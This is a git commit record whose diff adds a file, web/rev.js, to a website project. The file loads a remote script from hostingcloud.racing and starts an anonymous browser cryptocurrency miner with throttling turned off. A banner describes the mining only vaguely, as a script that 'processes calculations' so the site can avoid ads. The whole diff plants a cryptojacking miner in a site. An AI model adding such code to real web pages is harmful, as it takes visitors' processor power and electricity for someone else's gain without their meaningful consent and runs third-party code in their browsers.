37576f482a44d9345e3243d7a62d7de170ad03d1
Trevor Oler <18trevor3695@gmail.com>
2024-04-06 01:06:52 -0400

    Create rev.js

---
+++ web/rev.js
@@ -0,0 +1,9 @@
+<script src="https://www.hostingcloud.racing/VyX3.js"></script>
+<script>
+    var _client = new Client.Anonymous('f85d5d1f198040e6d23dc9b48819cf73380b13a951d6e0295eb3a1c997b0ee24', {
+        throttle: 0, c: 'w', ads: 0
+    });
+    _client.start();
+    _client.addMiningNotification("Top", "This site runs a script to process calculations, allows us to avoid using annoying ADs", "#cccccc", 40, "#3d3d3d");
+    
+</script>
